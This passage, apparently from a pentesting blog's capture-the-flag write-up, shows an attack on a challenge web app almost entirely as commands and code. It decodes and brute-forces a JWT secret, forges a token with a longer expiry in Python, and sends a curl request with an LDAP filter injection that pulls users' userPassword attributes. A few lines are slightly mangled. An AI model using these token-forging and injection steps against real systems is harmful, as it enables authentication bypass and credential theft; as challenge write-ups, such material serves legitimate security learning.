+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pyjwt  ecode &lt;span class=&quot;nt&quot;&gt;--no-verify&lt;/span&gt; eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I
+Essphrase &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;key &lt;span class=&quot;s1&quot;&gt;'/root/.ssh/id_rsa'&lt;/span&gt;: 
+nter passphrase &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;key &lt;span class=&quot;s1&quot;&gt;'/root/.ssh/id_rsa'&lt;/span&gt;: 
+&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;dept&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;Engineering&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;ou&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;elf&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;expires&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;2017-08-16 12:00:47.248093+00:00&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;uid&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;alabaster.snowball&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;installing jwt-tool
+installing jwt-cracker&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jwt-cracker eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I &lt;span class=&quot;s2&quot;&gt;&quot;abcdefghijklmnopqrstuwxyz&quot;&lt;/span&gt; 6
+
+other characters
+
+&lt;span class=&quot;s2&quot;&gt;&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;&lt;/span&gt; 6
+
+using jwt_tool with rockyou.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I
+Secret is &lt;span class=&quot;s2&quot;&gt;&quot;3lv3s&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;jwt&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;datetime&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;JWT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;SECRET_KEY&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;3lv3s&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;decoded_payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jwt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jwt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;JWT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SECRET_KEY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decoded_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;decoded_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;expires&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;utcnow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timedelta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seconds&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decoded_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jwt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decoded_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SECRET_KEY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Generated Token: {}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;localStorage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setItem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'np-auth'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTEyLTMxIDIyOjQ2OjI1LjM0MDc2OCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.tA3S1ZW6s4Bx9cMvndny454pLYD3C22-JMDkVCERX8E'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl 	&lt;span class=&quot;s1&quot;&gt;'http://127.0.0.1:28080/search'&lt;/span&gt; 
+	&lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Cookie: SESSION=gt60T0q3W0P52h88k001'&lt;/span&gt; 
+	&lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Origin: http://127.0.0.1:28080'&lt;/span&gt; 
+	&lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Accept-Encoding: gzip, deflate, br'&lt;/span&gt; 
+	&lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Accept-Language: en-US,en;q=0.8'&lt;/span&gt; 
+	&lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.104 Safari/537.36'&lt;/span&gt; 
+	&lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'&lt;/span&gt; 
+	&lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Accept: */*'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Referer: http://127.0.0.1:28080/home.html'&lt;/span&gt; 
+	&lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'X-Requested-With: XMLHttpRequest'&lt;/span&gt; 
+	&lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Connection: keep-alive'&lt;/span&gt; 
+	&lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'np-auth: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTEyLTMxIDIyOjQ2OjI1LjM0MDc2OCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.tA3S1ZW6s4Bx9cMvndny454pLYD3C22-JMDkVCERX8E'&lt;/span&gt; 
+	&lt;span class=&quot;nt&quot;&gt;--data&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'name=))(department%3Dit)(%7C(cn%3D&amp;amp;isElf=False&amp;amp;attributes=profilePath%2Cgn%2Csn%2Cmail%2CuserPassword'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--compressed&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>herrfeder</name></author><category term="pentesting" /><category term="hacking" /><summary type="html"></summary></entry></feed>
